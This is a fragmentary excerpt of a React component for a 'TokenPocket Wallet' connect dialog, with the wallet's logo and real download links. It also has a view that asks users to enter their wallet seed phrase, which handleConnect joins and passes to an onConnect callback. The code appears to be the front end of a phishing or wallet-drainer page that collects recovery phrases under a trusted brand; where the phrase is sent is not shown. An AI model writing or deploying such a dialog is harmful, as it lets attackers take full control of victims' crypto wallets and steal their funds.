...
export default function TokenPocketWalletModal({ onClose, onConnect, onBack, onStartConnect }) {
  ...
  const handleConnect = () => {
    ...
    if (onConnect) {
      onConnect('TokenPocket Wallet', seedWords.join(' '));
    }
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>TokenPocket Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <div style={{
                  ...
                  <img src="/icons/tokenpocket_17.png" alt="TokenPocket" style={{ width: 44, height: 44, objectFit: 'contain', filter: 'contrast(1.3) brightness(1.05)' }} />
                </div>
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Connect TokenPocket using the browser extension, website, or mobile app. You can also restore your wallet with your KeyPal phrase.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get TokenPocket</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://extension.tokenpocket.pro/?locale=en"
                    target="_blank"
                  ...
                  <a
                    href="https://apps.apple.com/app/tokenpocket/id1450322340"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  <a
                    href="https://play.google.com/store/apps/details?id=com.tokenpocket"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your TokenPocket/KeyPal seed phrase to continue
              </p>
